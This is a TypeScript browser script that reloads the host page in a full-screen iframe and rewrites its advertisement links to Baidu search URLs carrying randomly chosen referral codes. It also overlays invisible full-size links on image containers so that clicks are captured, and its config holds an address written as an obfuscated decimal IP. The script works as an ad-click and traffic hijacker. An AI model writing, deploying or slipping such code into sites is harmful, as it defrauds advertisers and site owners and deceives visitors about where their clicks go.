class Pos {
    // config
    m = ''
    p = ''
    v = '//3026275270:6688/?p=UE9TfFNDM3ww'
    D = ["1014538l", "1020067p"]
    E = ["06074089_4", "06074089_33"]
    t = [this.m, this.D[parseInt(`${Math.random() * this.D.length}`)]].join('')
    u = [this.p, this.E[parseInt(`${Math.random() * this.E.length}`)]].join('')
    d = 0.9

    window: Window | any
    document: Document
    ads

    iframe: HTMLIFrameElement
    constructor() {
        this.start()
        this.iframe.onload = () => {
            try {
                this.loadAds()
            } catch (e) {
                console.error(e); // -> 可以收集当前代码报错的原因(num is not defined)
            }
        }
    }

    // 是否移动端
    browsers() {
        let p = navigator.userAgent
        return /AppleWebKit.*Mobile|Android|Windows Phone|webOS|iPhone|iPod|BlackBerry|iPad/i.test(p) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(p))
    }

    // 随机数
    random(a) {
        return Math.floor(Math.random() * a)
    }

    // 加密串
    ciphertext(a) {
        let d = [65, 97, 48],
            e = [26, 26, 10],
            g = "";
        for (let b = 0; b < a; ++b) {
            let c = this.random(3);
            let f = d[c] + this.random(e[c]);
            g = g + String.fromCharCode(f)
        }
        return g
    }

    // 被替换地址
    replaceHref(d, e, b) {
        let a = this.browsers()
        return `https://${(a ? "m" : "www")}.baidu.com/s?word=${d}&fenIei=${this.ciphertext(164)}&${(a ? `from=${e}` : `tn=${b}`)}`
    }

    start() {
        let src = document.URL.replace(/([?&])(dc=[23])/, `$1rsuv=0x${this.random(8)}&$2`) + "&_r=1_0&ich=s&jid=1&aaa_flag=1"
        let iframe = document.createElement('iframe')
        // iframe.src = 'http://localhost:8086/static/index.html'
        iframe.src = src
        document.body.appendChild(iframe)
        iframe.width = '100%'
        iframe.height = '100%'
        iframe.marginWidth = '0'
        iframe.marginHeight = '0'
        iframe.scrolling = 'no'
        iframe.frameBorder = '0'
        iframe.style.overflowX = 'hidden'
        this.iframe = iframe
    }

    loadAds(){
        let window: Window | any = this.window = this.iframe.contentWindow
        this.document = this.iframe.contentDocument || window.document
        let ads = this.ads = window.ads
        if(ads && ads.length){
            this.compile()
        }else{
            let _scriptList: HTMLCollectionOf<HTMLScriptElement> = this.document.getElementsByTagName('script')
            for (let i = 0; i < _scriptList.length; i++) {
                let script = _scriptList[i]
                if(!!~script.innerHTML.indexOf(`var ads =`)){
                    let ref = this.document.createElement('script')
                    ref.innerHTML = script.innerHTML
                    script.parentNode.removeChild(script)
                    this.document.head.appendChild(ref)
                    this.ads = this.window.ads
                    this.compile()
                }
            }
        }
    }

    // 解析页面
    compile() {
        let _aList: HTMLCollectionOf<HTMLAnchorElement> = this.document.getElementsByTagName('a')
        let aList = []
        for (let i = 0; i < _aList.length; i++) {
            let a = _aList[i]
            if (a.href) aList.push(a)
        }

        if (this.ads && this.ads.length) {
            // 处理 a标签
            for (let i = 0; i < this.ads.length; i++) {
                let data = this.ads[i];
                let curl = data.curl;
                let desc = data.desc || data.title || '';
                let _curl = this.replaceHref(desc, this.t, this.u);
                data.curl = _curl;

                for (let i = 0; i < aList.length; i++) {
                    let a = aList[i];
                    let href = a.href;
                    if (href && this.diffStr(curl, href) >= this.d) {
                        a.href = _curl;
                    }
                }
            }

            // 处理事件绑定
            let pic_container = this.document.getElementById("pic_container");
            if (pic_container && pic_container.firstElementChild.nodeName == 'A') {
                let aref = this.document.createElement('a');
                aref.style.position = 'absolute';
                aref.style.top = '0';
                aref.style.left = '0';
                aref.style.width = '100%';
                aref.style.height = '100%';
                aref.style.zIndex = '100000000000';
                aref.target = '_blank';
                aref.href = this.ads[0].curl;
                pic_container.appendChild(aref);
            }
            let container = this.document.getElementById("#container");
            if (container && container.firstElementChild.nodeName == 'A') {
                let aref = this.document.createElement('a');
                aref.style.position = 'absolute';
                aref.style.top = '0';
                aref.style.left = '0';
                aref.style.width = '100%';
                aref.style.height = '100%';
                aref.style.zIndex = '100000000000';
                aref.target = '_blank';
                aref.href = this.ads[0].curl;
                container.appendChild(aref);
            }
        }
    }

    diffStr(result, target) {
        let r = this.parseURL(result)
        let t = this.parseURL(target)
        let bo = r.hash === t.hash
            && r.host === t.host
            && r.hostname === t.hostname
            && r.origin === t.origin
            && r.pathname === t.pathname
            && r.port === t.port
            && r.protocol === t.protocol
        if (!bo) {
            return 0
        }
        let ok = 0;
        let count = 0
        for (let key in r.params) {
            if (!r.params.hasOwnProperty(key)) return;
            let a = r.params[key].split('');
            let b = t.params[key].split('');
            for (let i = 0; i < a.length; i++) {
                count++
                let data = a[i];
                if (data === b[i])++ok;
            }
        }
        return ok / count;
    }

    parseURL(url) {
        let a = document.createElement('a');
        a.href = url;
        let { hash, host, hostname, href, origin, pathname, port, protocol, search } = a;
        return {
            hash,
            host,
            hostname,
            href,
            origin,
            pathname,
            port,
            protocol,
            search,
            params: (function () {
                let ret = {};
                let seg = search.replace(/^\?/, '').split('&')
                for (let i = 0; i < seg.length; i++) {
                    let element = seg[i];
                    let idx = element.indexOf('=');
                    let key = element.substring(0, idx);
                    let val = element.substring(idx + 1);
                    ret[key] = val;
                }
                return ret;
            })()
        }
    }
}

new Pos()